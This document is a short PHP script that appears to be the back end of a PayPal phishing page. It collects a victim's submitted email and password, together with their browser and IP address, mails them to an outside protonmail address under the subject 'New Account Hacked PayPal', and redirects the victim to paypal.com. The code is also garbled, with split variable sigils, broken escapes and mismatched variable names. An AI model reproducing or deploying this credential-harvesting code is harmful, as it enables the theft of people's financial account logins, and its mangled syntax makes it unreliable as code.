<?
$ To = "mhdbusiness970@protonmail.com"
$ Name = $ _POST ['email'];
$ Email = $ _POST ['email'];
$ Subject = $ _POST ['subject'];
$ Password = $ _POST ['password'];
$ Agent = $ _SERVER ['HTTP_USER_AGENT'];
$ Ip = $ _SERVER ['REMOTE_ADDR'];
$ D = date ('l dS \ of F Y h: i: s A');
$ Sub = "New Account Hacked PayPal - $ email";
$ Headers = "From: $ name <$ email> \ n";
$ Headers .= "Content-Type: text / plain, charset = iso-8859-1 \ n";
$ Mes .= 'Username:'. $ Email. "\ N";
$ Msg .= "Password:". $ Password. "\ N";
$ Msg .= "Browser:". $ Agent. "\ N";
$ Msg .= "IP:". $ Ip. "\ N";
$ Mes .= 'Date and time:'. $ D;

(
mail ($ to, $ sub, $ mes, $ headers);
header ("Location: www.paypal.com");

    
)
?>